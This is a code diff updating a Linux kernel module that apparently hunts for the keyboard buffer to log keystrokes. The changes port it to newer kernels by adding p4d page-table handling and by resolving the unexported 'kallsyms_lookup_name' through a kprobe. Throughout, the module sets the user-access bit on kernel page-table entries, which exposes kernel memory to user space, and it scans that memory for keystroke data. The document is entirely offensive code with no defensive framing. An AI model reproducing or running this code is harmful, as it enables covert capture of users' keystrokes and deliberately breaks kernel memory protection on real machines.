@@ -7,34 +7,48 @@
 #include <linux/pci.h>
 #include <linux/mm.h>
 #include <linux/kallsyms.h>
+#include <linux/kprobes.h>
+
+static struct kprobe kp = {
+    .symbol_name = "kallsyms_lookup_name"
+};
+
 #define TARGET		"keylog"
 #define WRITE_PAGE	0x40000000
 #define SEND_BUFFER	0x50000000
 
-unsigned long _init_level4_pgt;
-unsigned long start = PAGE_OFFSET;
+unsigned long _init_top_pgt;
+unsigned long start;
 unsigned long end = 0xffff880280000000;
 unsigned long i;
 
 int is_valid_addr(unsigned long long addr)
 {
         pgd_t *pgd;
+	p4d_t *p4d;
         pte_t *pte;
         pud_t *pud;
         pmd_t *pmd;
 
 	if( addr < 0xffff880000000000 ) return 0;
  
-        pgd = _init_level4_pgt + (pgd_index(addr) * 8);
+        pgd = _init_top_pgt + (pgd_index(addr) * 8);
         if (pgd_none(*pgd) || pgd_bad(*pgd))
                 return 0;
 
         *(unsigned long*)pgd |= _PAGE_USER;
-        pud = pud_offset(pgd, addr);
+        p4d = p4d_offset(pgd, addr);
+        if (p4d_none(*p4d) || p4d_bad(*p4d)){
+		if( (p4d->p4d & PTE_FLAGS_MASK) == 0 ) return 0;
+		return 1;
+	}
+
+        *(unsigned long*)p4d |= _PAGE_USER;
+        pud = pud_offset(p4d, addr);
         if (pud_none(*pud) || pud_bad(*pud)){
-			if( (pud->pud & PTE_FLAGS_MASK) == 0 ) return 0;
-            return 1;
-		}
+		if( (pud->pud & PTE_FLAGS_MASK) == 0 ) return 0;
+		return 1;
+	}
 
         *(unsigned long*)pud |= _PAGE_USER;
         pmd = pmd_offset(pud, addr);
@@ -56,6 +70,7 @@ int modify_pgt_start( unsigned long _phys, unsigned long addr )
 	unsigned long pfn, tmp, offset;
 
 	pgd_t *pgd;
+	p4d_t *p4d;
 	pud_t *pud;
 	pmd_t *pmd;
 	pte_t *pte;
@@ -67,7 +82,12 @@ int modify_pgt_start( unsigned long _phys, unsigned long addr )
 				printk( "bad pgd\n" );
 				return 0;
 			}
-			pud = pud_offset( pgd, addr );
+			p4d = p4d_offset( pgd, addr );
+			if( p4d_none( *p4d ) || p4d_bad( *p4d ) ){
+				printk( "bad p4d\n" );
+				return 0;
+			}
+			pud = pud_offset( p4d, addr );
 			if( pud_none( *pud ) || pud_bad( *pud ) ){
 				printk( "bad pud\n" );
 				return 0;
@@ -106,15 +126,23 @@ int modify_pgt_start( unsigned long _phys, unsigned long addr )
 
 static int __init search_kbdbuf_start(void)
 {
-	int len;
+	int len, ret;
 	unsigned long i,j;
 	char buf[256];
 
-	_init_level4_pgt = kallsyms_lookup_name("init_level4_pgt");
-	if( !_init_level4_pgt ){
-		printk("init_level4_gpt not found!\n");
+	register_kprobe(&kp);
+
+	typedef unsigned long (*KALLSYMS_LOOKUP_NAME)(const char *);
+	KALLSYMS_LOOKUP_NAME kallsyms_lookup_name;
+	kallsyms_lookup_name = (KALLSYMS_LOOKUP_NAME)kp.addr;
+
+	start = PAGE_OFFSET;
+	_init_top_pgt = kallsyms_lookup_name("init_top_pgt");
+	if( !_init_top_pgt ){
+		printk("init_top_gpt not found!\n");
 		return 0;
 	}
+
 	printk( "locating the keyboard buffer\n" );
 	for( i = 0; start+i < end; i += 0x10 ){
 		if( is_valid_addr(start+i) == 0 ){
